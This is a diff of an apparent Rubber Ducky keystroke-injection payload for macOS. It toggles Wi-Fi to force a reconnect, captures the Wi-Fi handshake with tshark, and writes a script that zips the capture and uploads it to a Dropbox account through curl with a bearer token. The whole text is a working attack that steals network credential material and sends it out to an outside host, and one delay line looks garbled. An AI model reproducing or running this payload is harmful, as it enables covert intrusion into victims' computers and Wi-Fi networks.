@@ -33,11 +33,11 @@ DELAY 500
 STRING  networksetup -setairportpower en0 off
 DELAY 500
 ENTER
-DELAY 5terminal00
+DELAY 1000
 STRING  tshark -i en0 -w ~/Desktop/captured.pcap & 
-DELAY 500
+DELAY 1000
 ENTER
-DELAY 500
+DELAY 6000
 STRING  networksetup -setairportpower en0 on
 DELAY 500
 ENTER 
@@ -48,7 +48,7 @@ ENTER
 DELAY 500 
 CTRL c
 DELAY 2000
-STRING  echo 'cd ~/Desktop && zip -r "CapturedHandshake.zip" captured.pcap && curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorization: Bearer <API ACCESS TOKEN>" -H "Dropbox-API-Arg: {\"path\": \"/Backup/CapturedHandshake.zip\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary @"CapturedHandshake.zip"' > upload.sh
+STRING  echo 'cd ~/Desktop && zip -r "CapturedHandshake.zip" captured.pcap && curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorization: Bearer \<API ACCESS TOKEN>" -H "Dropbox-API-Arg: {\"path\": \"/Backup/CapturedHandshake.zip\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary @"CapturedHandshake.zip"' > upload.sh
 DELAY 500
 ENTER
 DELAY 2500
